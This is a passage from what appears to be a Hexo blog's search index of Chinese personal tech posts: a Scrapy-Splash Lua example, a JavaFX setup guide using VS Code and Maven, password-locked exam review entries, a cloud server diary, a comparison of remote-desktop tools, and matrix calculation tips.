<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="编写splash-lua脚本"><a class="markdownIt-Anchor" href="#编写splash-lua脚本"></a> 编写Splash Lua脚本</h2>
<p>有时候需要点击按钮或者填写表单,这时候可以使用Splash的Lua脚本功能.例如:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">lua_script <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
function main(splash, args)
  splash:go(args.url)
  splash:wait(args.wait or 2)
  return splash:html()
end
"""</span>

<span class="token keyword">class</span> <span class="token class-name">MySpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># ...其他部分</span>

    <span class="token keyword">def</span> <span class="token function">start_requests</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> url <span class="token keyword">in</span> self<span class="token punctuation">.</span>start_urls<span class="token punctuation">:</span>
            <span class="token keyword">yield</span> SplashRequest<span class="token punctuation">(</span>url<span class="token punctuation">,</span> self<span class="token punctuation">.</span>parse_result<span class="token punctuation">,</span> endpoint<span class="token operator">=</span><span class="token string">'execute'</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'lua_source'</span><span class="token punctuation">:</span> lua_script<span class="token punctuation">,</span> <span class="token string">'wait'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项"></a> 注意事项</h2>
<ul>
<li>请求频率: 使用Splash会增加请求的开销，因为它渲染整个页面。确保不要对目标网站发送过多的请求，以避免被封禁。</li>
<li>错误处理: Splash可能会遇到渲染JavaScript页面时的问题。务必处理可能出现的错误，并考虑设置请求超时时间。</li>
<li>资源优化: 如果只关心页面上的某些部分，考虑禁用图片或其他不必要的资源加载以节省带宽和时间。</li>
</ul>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Vscode-maven安装javaFX</title>
    <url>/2023/09/26/21-02-21/</url>
    <content><![CDATA[<p>JDK8往后的版本都不再默认支持JavaFX了，作为VScode的重度用户，不想去换其他的IDE，于是使用VScode的Maven来完成JavaFX的安装。</p>
<span id="more"></span>
<h2 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h2>
<p>安装完毕JDK（我使用的是JDK17），并在vscode中配置好路径和Maven<br>
注意要配置JAVA_HOME环境变量。</p>
<h2 id="maven配置阿里云镜像"><a class="markdownIt-Anchor" href="#maven配置阿里云镜像"></a> Maven配置阿里云镜像</h2>
<p>一开始我的下载速度非常慢，甚至会下载超时，后来改了镜像源之后直接起飞。<br>
打开Maven的安装目录，找到conf/settings.xml，向mirrors中添加这一段：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>alimaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>aliyun maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">&gt;</span></span>http://maven.aliyun.com/nexus/content/groups/public/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">&gt;</span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">&gt;</span></span>        
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPHrxJA.png" alt="mirror" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPHrxJA.png'">
<h2 id="使用maven配置javafx项目"><a class="markdownIt-Anchor" href="#使用maven配置javafx项目"></a> 使用Maven配置JavaFX项目</h2>
<p>JavaFX是模块化的，需要根据需求逐个添加对应的模块</p>
<h3 id="创建maven原型"><a class="markdownIt-Anchor" href="#创建maven原型"></a> 创建Maven原型</h3>
<img src="/images/posts/pPHrzRI.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPHrzRI.png'">
<img src="/images/posts/pPHsSzt.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPHsSzt.png'">
<p>选择好架构后命名，并选择目标文件夹<br>
如果没有什么项目管理需求的话这个不用太在意，敲两下回车就行</p>
<img src="/images/posts/pPHs9QP.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPHs9QP.png'">
<p>完成了像这样：</p>
<img src="/images/posts/pPHsCsf.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPHsCsf.png'">
<h3 id="安装javafx依赖"><a class="markdownIt-Anchor" href="#安装javafx依赖"></a> 安装JavaFX依赖</h3>
<p>在左下角可以看到有Maven的工作区，这里有两种添加模块的方式：</p>
<ol>
<li>直接向pom.xml中添加依赖</li>
<li>在Maven的Dependencies项上点击+号</li>
</ol>
<p>两者本质一样，都是向pom.xml中加入这样几段：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.openjfx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>javafx-graphics<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.openjfx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>javafx-controls<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>确认JDK版本是否与自己的一致<br>
保存后右下角会弹出对话框，点击yes检查依赖是否正确。<br>
检查完毕后回到左边Maven的工作区，在Lifecycle中执行clean、validate、install操作来确保依赖正确安装。</p>
<h3 id="超级大坑运行javafx程序"><a class="markdownIt-Anchor" href="#超级大坑运行javafx程序"></a> 超级大坑，运行JavaFX程序</h3>
<p>有如下测试代码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// System.out.println("constructor");</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// @Override // Override the start method in the Application class</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// System.out.println("start");</span>
        <span class="token comment">// Create a button and place it in the scene</span>
        <span class="token class-name">Button</span> btOK <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>btOK<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"MyJavaFX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Set the stage title</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Place the scene in the stage</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Display the stage</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * The main method is only needed for the IDE with limited
     * JavaFX support. Not needed for running from the command line.
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// System.out.println("launch");</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接执行main会报错：<strong>错误: 缺少 JavaFX 运行时组件, 需要使用该组件来运行此应用程序</strong><br>
wtf？不是才安装完了依赖么？怎么会找不到的？</p>
<p>解决方法很简单：不要在这里运行程序，去掉这个main，新写一个Main.java来执行，像这样：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Application</span><span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token class-name">App</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行这个main，完美解决问题。<br>
运行结果：</p>
<img src="/images/posts/pPHsPL8.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPHsPL8.png'">
<p>要问我原理？我不到啊。</p>
]]></content>
      <categories>
        <category>环境</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>javafx</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全复习</title>
    <url>/2023/12/24/19-46-43/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="749984e5081730b119aef8e7f27e50130fbc503497798fe40715b72640cb8718"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-surge">
      <input class="hbe hbe-input-field hbe-input-field-surge" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-surge" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-surge" data-content="请输入密码.">请输入密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-surge" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M1200,9c0,0-305.005,0-401.001,0C733,9,675.327,4.969,598,4.969C514.994,4.969,449.336,9,400.333,9C299.666,9,0,9,0,9v43c0,0,299.666,0,400.333,0c49.002,0,114.66,3.484,197.667,3.484c77.327,0,135-3.484,200.999-3.484C894.995,52,1200,52,1200,52V9z"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>复习</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>fx</tag>
      </tags>
  </entry>
  <entry>
    <title>信息检索复习</title>
    <url>/2023/12/31/10-12-43/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="300d47bf08ab1094ab5155bd4be42ad6d7d7b08fb7bea90ac1949ec8d49a5b8b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-surge">
      <input class="hbe hbe-input-field hbe-input-field-surge" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-surge" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-surge" data-content="请输入密码.">请输入密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-surge" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M1200,9c0,0-305.005,0-401.001,0C733,9,675.327,4.969,598,4.969C514.994,4.969,449.336,9,400.333,9C299.666,9,0,9,0,9v43c0,0,299.666,0,400.333,0c49.002,0,114.66,3.484,197.667,3.484c77.327,0,135-3.484,200.999-3.484C894.995,52,1200,52,1200,52V9z"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>复习</category>
      </categories>
      <tags>
        <tag>fx</tag>
        <tag>信息检索</tag>
      </tags>
  </entry>
  <entry>
    <title>各种数据分析模型框架</title>
    <url>/2023/12/24/19-46-43/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d3c7b2655947a2e9032c31cc17300c1e64b917594d6e3093bbf1510473acd672"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-surge">
      <input class="hbe hbe-input-field hbe-input-field-surge" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-surge" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-surge" data-content="请输入密码.">请输入密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-surge" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M1200,9c0,0-305.005,0-401.001,0C733,9,675.327,4.969,598,4.969C514.994,4.969,449.336,9,400.333,9C299.666,9,0,9,0,9v43c0,0,299.666,0,400.333,0c49.002,0,114.66,3.484,197.667,3.484c77.327,0,135-3.484,200.999-3.484C894.995,52,1200,52,1200,52V9z"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>框架</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>Pytorch</tag>
        <tag>sklearn</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>我入手了第一台云服务器</title>
    <url>/2022/10/09/16-15-43/</url>
    <content><![CDATA[<p>就在刚刚，我下了一笔120的“大单子”，购买了一台腾讯云服务器，非常激动。</p>
<span id="more"></span>
<p>然后就遇到个问题：为啥我什么网站都打不开，但是edge的首页推荐能保持正常？<br>
麻了，试了很多方法都没用。想碰运气开了下防火墙，直接连不上了。重装试一下。<br>
重装了Windows server 2019，直接完事了😥。话说我按照正常计算机的方式去配置这台服务器会有问题吗？<br>
这个双核有啥用啊，开个网页占用就满了？<br>
正在同步vscode：我才意识到我的扩展是有多离谱了，这台服务器足足卡了3分钟才同步完毕。我不得已关闭了同步并且关闭了一些不常用的扩展。包括AI自动补全和暂时不用的Java语言支持。<br>
安装git，不过有一说一，网速挺快的hhh</p>
]]></content>
      <categories>
        <category>废话</category>
      </categories>
      <tags>
        <tag>废话</tag>
        <tag>云服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>折腾折腾远控</title>
    <url>/2022/10/10/20-17-16/</url>
    <content><![CDATA[<p>线下课让我感觉非常不方便，我没办法随时编写调试代码，除非把这笔记本搬出来，那太麻烦了，续航也是个问题。于是我便打起了远控的主意。</p>
<span id="more"></span>
<h2 id="todesk"><a class="markdownIt-Anchor" href="#todesk"></a> todesk</h2>
<p>这是我很早就在用的一个远控方案，当时没有接触多少产品，所以对它的效果感到非常不满，后来有听说有安全隐患，便不再使用了。</p>
<h2 id="sakura-frp-rdp"><a class="markdownIt-Anchor" href="#sakura-frp-rdp"></a> sakura Frp + RDP</h2>
<p>sakuraFrp 是我之前尝试MC联机时候的找到的内网穿透工具，没想到内网穿透的功能有这么多。用它打通本机3389端口(Winodws远程控制端口)后，我可以直接用RDP连接到这台机器。但效果不如人意，延迟表现不大行。</p>
<h2 id="rustdesk-腾讯云"><a class="markdownIt-Anchor" href="#rustdesk-腾讯云"></a> rustdesk + 腾讯云</h2>
<p>前两天刚买的腾讯云，我现在想让它派上些用场，于是想将它作为中继服务器用于远程控制。于是我便找到了Rustdesk。用起来很简单，在腾讯云上配置下服务端，然后再在我的移动设备上设置下ID服务器即可（至于为什么不用它的公共服务器，我只能说基本没法用）。<br>
这个方案的画面是我用过的最好的，也是最稳定的。但是它有个最大的问题就是：我在平板上根本没办法正常输入文字。这种问题太多以至于我无法一一列举出来。</p>
<h2 id="parsec"><a class="markdownIt-Anchor" href="#parsec"></a> parsec</h2>
<p>这是从一开始就失败了的尝试，因为它被墙了。</p>
<h2 id="闪门shangate"><a class="markdownIt-Anchor" href="#闪门shangate"></a> 闪门(shanGate)</h2>
<p>这是我在搜索和parsec有关的信息的时候看到的。延迟和帧数都有保证，但是它会让我的显示分辨率出现bug（我真的纯纯bug体质了）。</p>
<h2 id="rdp"><a class="markdownIt-Anchor" href="#rdp"></a> RDP</h2>
<p>尝试了这么多，我现在在用的是什么呢？就这个，单纯的RDP就能解决的问题，我不知道我为什么要搞这么多，折腾这么久<br>
方便，直接，不错的远控体验，我还需要追求什么？只能说-我是傻逼。</p>
]]></content>
      <categories>
        <category>远程控制</category>
      </categories>
      <tags>
        <tag>远程控制</tag>
      </tags>
  </entry>
  <entry>
    <title>数据分析基础复习</title>
    <url>/2024/01/05/15-08-42/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fa63c8185e683aed004a43f0b15e688afdb82e0cb964920d6e3592b4d7cc371b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-surge">
      <input class="hbe hbe-input-field hbe-input-field-surge" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-surge" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-surge" data-content="请输入密码.">请输入密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-surge" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M1200,9c0,0-305.005,0-401.001,0C733,9,675.327,4.969,598,4.969C514.994,4.969,449.336,9,400.333,9C299.666,9,0,9,0,9v43c0,0,299.666,0,400.333,0c49.002,0,114.66,3.484,197.667,3.484c77.327,0,135-3.484,200.999-3.484C894.995,52,1200,52,1200,52V9z"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>复习</category>
      </categories>
      <tags>
        <tag>zz</tag>
        <tag>数据分析基础</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵计算的一些技巧</title>
    <url>/2022/10/18/16-59-26/</url>
    <content><![CDATA[<p>三阶矩阵的求逆、矩阵乘法</p>
<span id="more"></span>
<h2 id="矩阵乘法"><a class="markdownIt-Anchor" href="#矩阵乘法"></a> 矩阵乘法</h2>
<img src="/images/posts/xskyGD.md.jpg" alt="Optional Alt Text" onerror="this.onerror=null; this.src='https://s1.ax1x.com/2022/10/19/xskyGD.jpg'">
<h2 id="三阶矩阵求逆"><a class="markdownIt-Anchor" href="#三阶矩阵求逆"></a> 三阶矩阵求逆</h2>
<img src="/images/posts/xskWqI.jpg" alt="Optional Alt Text" onerror="this.onerror=null; this.src='https://s1.ax1x.com/2022/10/19/xskWqI.jpg'">
]]></content>
      <tags>
        <tag>矩阵</tag>
        <tag>线性代数</tag>
      </tags>
  </entry>
</search>
